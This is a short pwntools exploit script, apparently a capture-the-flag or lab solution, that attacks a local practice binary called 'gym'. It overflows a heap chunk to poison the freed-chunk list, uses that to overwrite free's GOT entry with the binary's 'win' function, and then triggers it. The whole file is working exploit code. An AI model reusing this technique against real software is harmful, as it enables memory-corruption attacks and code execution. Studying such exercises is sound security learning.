#!/usr/bin/python3
# ./attack.py GDB or ./attack.py
from pwn import process, gdb, args, p64, ELF

binary = './gym'

gs = """
break main
continue
"""

e = ELF(binary)

END_OF_MENU = "e.g, l\n"


def malloc(p):
    p.sendline(b"m 8")
    print("m 8")
    print(p.recvuntil(END_OF_MENU).decode())


def free(p, index):
    p.sendline(b"f %d" % index)
    print("free")
    print(p.recvuntil(END_OF_MENU).decode())


def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    print("edit ")
    print(p.recvuntil(END_OF_MENU).decode())


def exit(p):
    p.sendline(b"0")


def launch_attack(p):
    p.recvuntil(END_OF_MENU)
    # 1. malloc two chunks
    malloc(p)
    malloc(p)
    # 2. free the chunk with index of 1
    free(p, 1)
    # 3. overflow thunk with index of 0
    content = b'a' * (0x20 - 8) + b'\x21' + b'\x00' * 7 + p64(e.got["free"])
    edit(p, 0, content)
    # 4. allocate chunk -> 1, index of 2
    malloc(p)
    # 5. allocate chunk -> victim, index of 3
    malloc(p)
    # 6. edit the chunk of 3, fill in the winning function
    edit(p, 3, p64(e.symbols["win"]))
    # 7. trigger the vulnerability by calling free
    p.sendline(b"f 0")
    p.recvline()
    print(p.recvline())


def main():
    if args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p = process(binary)

    launch_attack(p)

    # Make sure that this is kept for gdb
    # p.interactive()


if __name__ == "__main__":
    main()
